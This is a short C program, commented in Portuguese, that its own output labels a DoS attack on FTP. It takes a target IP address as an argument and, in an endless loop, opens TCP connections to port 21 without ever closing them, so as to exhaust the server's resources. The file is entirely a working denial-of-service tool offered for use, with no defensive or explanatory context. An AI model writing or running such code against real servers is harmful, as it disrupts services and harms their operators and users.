#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdbool.h>

int main(int argc,char *argv[]){

        int meusocket;
        int conecta;

        bool ataque = true;

        char *destino;
        destino = argv[1];

        struct sockaddr_in alvo;

        while(ataque == true){

        meusocket = socket(AF_INET, SOCK_STREAM,0);
        alvo.sin_family = AF_INET;
        alvo.sin_port = htons(21);
        alvo.sin_addr.s_addr = inet_addr(destino);

        conecta = connect(meusocket, (struct sockaddr*)&alvo, sizeof alvo);

        printf("Realizando ataque DoS no FTP\n");
        }

return 0;
}